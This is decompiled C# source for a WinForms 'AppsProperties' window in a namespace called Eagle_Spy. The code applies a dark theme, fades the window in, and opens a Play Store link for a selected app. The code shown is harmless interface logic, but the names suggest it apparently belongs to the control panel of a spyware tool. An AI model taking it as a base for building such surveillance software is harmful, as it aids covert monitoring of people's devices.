using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x0200001F RID: 31
	[DesignerGenerated]
	public partial class AppsProperties : Form
	{
		// Token: 0x0600021E RID: 542 RVA: 0x000026D8 File Offset: 0x000008D8
		public AppsProperties()
		{
			base.Load += this.AppsProperties_Load;
			this.Title = "null";
			this.InitializeComponent();
			this.Font = reso.f;
		}

		// Token: 0x0600021F RID: 543 RVA: 0x00013ADC File Offset: 0x00011CDC
		private void AppsProperties_Load(object sender, EventArgs e)
		{
			base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\2.ico");
			this.SpyStyle();
			this.Text = this.Title;
			this.TOpacity.Interval = SpySettings.T_Interval;
			this.TOpacity.Enabled = true;
		}

		// Token: 0x06000220 RID: 544 RVA: 0x00013B34 File Offset: 0x00011D34
		private void SpyStyle()
		{
			foreach (Panel panel in base.Controls.OfType<Panel>())
			{
				panel.BackColor = Color.Black;
			}
			foreach (Label label in this.BOXPNL1.Controls.OfType<Label>())
			{
				label.ForeColor = Color.White;
				label.BackColor = Color.Black;
			}
			foreach (PictureBox pictureBox in this.BOXPNL1.Controls.OfType<PictureBox>())
			{
				pictureBox.BackColor = Color.Black;
			}
			this.LPermissions.ForeColor = Color.White;
		}

		// Token: 0x06000221 RID: 545 RVA: 0x0000270E File Offset: 0x0000090E
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
				return;
			}
			this.TOpacity.Enabled = false;
		}

		// Token: 0x06000222 RID: 546 RVA: 0x00002744 File Offset: 0x00000944
		private void BoxIcons_Click(object sender, EventArgs e)
		{
			Process.Start(string.Format("{0}{1}", "https://play.google.com/store/apps/details?id=", Conversions.ToString(this.BoxIcons.Tag)));
		}

		// Token: 0x040000BF RID: 191
		public string Title;
	}
}
